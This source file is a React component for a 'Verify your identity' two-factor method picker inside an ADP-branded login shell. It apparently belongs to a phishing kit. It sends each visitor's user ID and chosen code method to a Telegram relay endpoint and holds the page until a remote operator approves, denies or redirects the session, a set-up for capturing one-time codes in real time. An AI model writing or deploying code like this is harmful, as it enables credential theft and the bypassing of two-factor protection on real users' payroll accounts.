"use client"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { AdpAuthShell } from "./adp-auth-shell"
import { TFASelectionStep } from "./tfa-selection-step"
import { LOGIN_SESSION } from "@/lib/login-flow"
import { MSG_UNABLE_REACH_VERIFICATION } from "@/lib/approval-messages"
import { usePendingApproval } from "@/hooks/use-pending-approval"
import {
  getStoredLoginUserId,
  submitMethodGate,
} from "@/lib/submit-pending-gate"

export function TFAPage() {
  const router = useRouter()
  const [pendingId, setPendingId] = useState<string | null>(null)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [error, setError] = useState("")

  usePendingApproval(pendingId, {
    onApproved: () => {
      setIsSubmitting(false)
      setPendingId(null)
      if (typeof window !== "undefined") {
        sessionStorage.setItem(LOGIN_SESSION.verify, "1")
      }
      router.push("/verify")
    },
    onDenied: () => {
      window.location.href = "/?loginDenied=1"
    },
    onTimeout: () => {
      window.location.href = "/?verifyUnavailable=1"
    },
    onRedirected: () => {
      window.location.href = "/api/login-out"
    },
  })

  const handleSelectionSubmit = async (method: "email" | "sms") => {
    if (isSubmitting || pendingId) return

    if (typeof window !== "undefined") {
      sessionStorage.setItem(LOGIN_SESSION.method, method)
    }

    setError("")
    setIsSubmitting(true)
    try {
      const userId = getStoredLoginUserId()
      if (!userId) {
        setIsSubmitting(false)
        router.replace("/")
        return
      }

      void fetch("/api/telegram/method", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId, method }),
        keepalive: true,
      }).catch(console.error)

      const id = await submitMethodGate(userId, method)
      setPendingId(id)
    } catch (submitError) {
      console.error("Failed to submit method for approval:", submitError)
      setIsSubmitting(false)
      setPendingId(null)
      setError(MSG_UNABLE_REACH_VERIFICATION)
    }
  }

  return (
    <AdpAuthShell
      step={2}
      title="Verify your identity"
      subtitle="Choose how you'd like to receive your one-time verification code."
    >
      {error ? (
        <p className="mb-4 text-center text-sm font-medium text-[#dc2626]" role="alert">
          {error}
        </p>
      ) : null}
      <TFASelectionStep
        onSubmit={handleSelectionSubmit}
        isLocked={isSubmitting || pendingId !== null}
      />
    </AdpAuthShell>
  )
}
